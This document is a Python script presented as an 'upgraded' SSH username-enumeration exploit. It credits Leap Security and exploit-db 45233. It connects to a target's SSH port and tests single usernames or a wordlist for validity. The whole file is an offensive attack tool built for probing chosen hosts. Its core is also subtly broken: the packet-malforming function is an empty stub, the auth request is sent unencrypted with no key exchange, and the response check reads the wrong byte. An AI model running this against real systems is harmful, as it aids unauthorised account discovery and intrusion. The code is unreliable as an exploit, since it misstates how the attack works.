#!/usr/bin/env python3

import argparse
import logging
import socket
import sys
import os

class InvalidUsername(Exception):
    pass

# Malicious function to malform packet
def add_boolean(*args, **kwargs):
    pass

# Print valid users found so far
def print_result(valid_users):
    if valid_users:
        print("\nValid Users: ")
        for user in valid_users:
            print(user)
    else:
        print("\nNo valid user detected.")

# Perform authentication with malicious packet and username
def check_user(username):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((args.target, int(args.port)))

        # SSH protocol version exchange
        sock.send(b"SSH-2.0-OpenSSH_7.4\r\n")
        sock.recv(1024)

        # Build SSH_MSG_USERAUTH_REQUEST packet
        packet = b'\x00\x00\x00' + bytes([len(username) + 36])
        packet += b'\x14'  # SSH_MSG_USERAUTH_REQUEST
        packet += bytes([0, 0, 0, len(username)]) + username.encode('utf-8')
        packet += b'\x00\x00\x00\x0e' + b'ssh-connection'
        packet += b'\x00\x00\x00\x09' + b'publickey'
        packet += b'\x01\x00\x00\x00\x07' + b'ssh-rsa'
        packet += b'\x00\x00\x01\x01\x00' + b'\x00' * 255

        # Send the packet
        sock.send(packet)
        response = sock.recv(1024)

        if response[0] == 51:  # SSH_MSG_USERAUTH_FAILURE
            return True
        else:
            return False
    except Exception as e:
        print(f"\n[-] Error: {e}")
        return False
    finally:
        sock.close()

def check_userlist(wordlist_path):
    if os.path.isfile(wordlist_path):
        valid_users = []
        try:
            with open(wordlist_path) as f:
                for line in f:
                    username = line.rstrip()
                    sys.stdout.write(f"\rTesting: {username.ljust(50)}")
                    sys.stdout.flush()
                    if check_user(username):
                        valid_users.append(username)
                        sys.stdout.write(f"\n[+] {username} is a valid username\n")
                        sys.stdout.flush()
        except KeyboardInterrupt:
            print("\nEnumeration aborted by user!")
        print_result(valid_users)
    else:
        print(f"\n[-] {wordlist_path} is an invalid wordlist file")
        sys.exit(2)

parser = argparse.ArgumentParser(description='SSH User Enumeration by Leap Security (@LeapSecurity) UPGRADE VESION https://www.exploit-db.com/exploits/45233')
parser.add_argument('target', help="IP address of the target system")
parser.add_argument('-p', '--port', default=22, help="Set port of SSH service")
parser.add_argument('-u', '--user', dest='username', help="Username to check for validity.")
parser.add_argument('-w', '--wordlist', dest='wordlist', help="Username wordlist")

if len(sys.argv) == 1:
    parser.print_help()
    sys.exit(1)

args = parser.parse_args()

if args.wordlist:
    check_userlist(args.wordlist)
elif args.username:
    if check_user(args.username):
        print(f"\n[+] {args.username} is a valid username")
    else:
        print(f"\n[-] {args.username} is an invalid username")
else:
    print("\n[-] Username or wordlist must be specified!\n")
    parser.print_help()
    sys.exit(1)


# requirements
#
# argparse
